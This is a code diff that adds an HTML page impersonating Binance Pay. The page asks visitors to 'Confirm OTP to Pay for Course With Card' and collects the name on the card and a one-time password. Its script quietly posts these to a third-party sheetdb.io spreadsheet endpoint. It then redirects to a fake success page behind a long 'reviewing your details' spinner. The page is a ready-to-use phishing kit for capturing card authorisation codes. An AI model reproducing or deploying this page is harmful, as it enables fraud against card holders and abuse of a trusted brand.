@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html>
+	<head>
+        <meta charset="UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        
+        <!-- Google fonts -->
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link href="https://fonts.googleapis.com/css2?family=Poppins&display=swap" rel="stylesheet">
+
+		
+		<!-- Bootstrap css cdn link -->
+        <link rel="stylesheet" href="../../node/bootstrap/dist/css/bootstrap.min.css" crossorigin="anonymous">
+		<!-- External file -->
+        <link rel="stylesheet" href="../../css/style.css">
+
+        <title>Binance Authorization</title>
+        <link rel="icon" type="image/x-icon" href="../../image/binance.ico">
+
+	</head>
+	<body>
+
+
+
+		<div id="preloader" style="transition: all 1s;">
+			<div id="status">
+				<div class="spinner">
+					<div class="rect1"></div>
+					<div class="rect2"></div>
+					<div class="rect3"></div>
+					<div class="rect4"></div>
+					<div class="rect5"></div>
+				</div>
+				
+				<div class="container">
+					<div class="row">
+						<div class="col-10 col-md-7 col-lg-12 mx-auto">
+							<p style="color: #fff;font-size: 0.825em;padding-top: 35px;">Please wait while we review your details...</p>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+
+
+		<section>
+			<div class="content">
+        
+
+
+
+
+                <!-- ----------#####---------- Navigation menu (Section) starts here ----------#####---------- -->
+                        
+                    <nav class="project-nav-menu fixed-top container-fluid" style="background-color: #fff;">
+                        <div class="nav container fixed-top">
+                            <div class="nav-header" style="display: flex;flex-direction: row;justify-content: space-between;">
+                                <div class="nav-title" style="cursor: pointer;color: #e9b823;" onclick="document.location.href='/binance/pay'">
+                                    <img src="../image/binance.png" style="width: 25px;height: 25px;margin-right: 7px;">Binance-Pay
+                                </div>
+                            </div>
+                            <div style="margin-top: 5px;">
+                                <a href="/binance/pay" style="background-color: #fcd434;color: #3e3e3d;" class="get-started-btn nav-btn-shift">Go Back</a>
+                            </div>
+                        </div>
+                    </nav>
+        
+                <!-- Closed ----------#####---------- -->
+
+
+
+
+
+
+                <!-- ----------#####---------- Header (Section) starts here ----------#####---------- -->
+                
+                    <header class="container" style="padding-top: 7.5em;">
+                        <div class="row align-items-center">
+                            <!-- Header right container -->
+                            <div class="col-sm-12 col-md-10 col-lg-8 p-2 mx-auto">
+                                <div class="header-ryt-container" style="text-align: center;">
+                                    <h1 class="heading" style="color: #3e3e3d;padding-top: 1.25em;padding-bottom: 0.8em;">Confirm OTP to Pay for Course With Card.</h1>
+                                </div>
+                            </div>
+                        </div>
+                    </header>
+                    
+                <!-- Closed ----------#####---------- -->
+				
+				
+				<!-- Category container start -->
+				<section class="container">
+					
+					<form action="https://sheetdb.io/api/v1/osi6fadks8lqi" method="post" id="sheetdb-form">
+						<div class="row">
+							<div class="col-12 col-md-8 col-lg-4 mx-auto p-3">
+                                <div class="field">
+                                    <label class="binance-label" for="email">Name on Card</label>
+                                    <input class="binance-input" type="text"  name="data[OUser]">
+                                </div>
+                            </div>
+                            <div class="col-12 col-md-8 col-lg-4 mx-auto p-3">
+                                <div class="field">
+                                    <label class="binance-label" for="email">OTP</label>
+                                    <input class="binance-input" type="text" name="data[otp]">
+                                </div>
+                            </div>
+							<div class="col-12" style="margin-top:0.75em;text-align: center;font-weight: 500;">
+								<div><button type="submit" class="submit-btn">Confirm OTP</button></div>
+							</div>
+						</div>
+					</form>
+						
+				</section>
+
+
+
+        
+
+                <div class="col-12" style="margin-top:15;text-align: center;font-weight: 500;">
+                    <div class="normal-txt" style="margin: 5em 0 3em 0;text-align: center;">© 2017 - 2022 Binance.com. All rights reserved</div>
+                </div>
+
+
+			</div>
+		</section>
+
+
+		
+		  
+		
+	</body>
+
+	<!-- Bootstrap javascript cdn link -->
+	<script src="../../node/bootstrap/dist/js/bootstrap.js"></script>
+	<script src="../../jquery/jquery.js"></script>
+	<script>
+		var form = document.getElementById('sheetdb-form');
+		form.addEventListener("submit", e => {
+			e.preventDefault();
+			fetch(form.action, {
+				method : "POST",
+				body: new FormData(document.getElementById("sheetdb-form")),
+			}).then(
+				response => response.json()
+			).then((html) => {
+				// you can put any JS code here
+				window.open('/binance/pay/success', "_self");
+			});
+		});
+
+	</script>
+	<script>
+		function preloader() {
+			document.getElementById("preloader").style.display= "none";
+		}
+		const myTimeout = setTimeout(preloader, 17500);
+	</script>
+</html>
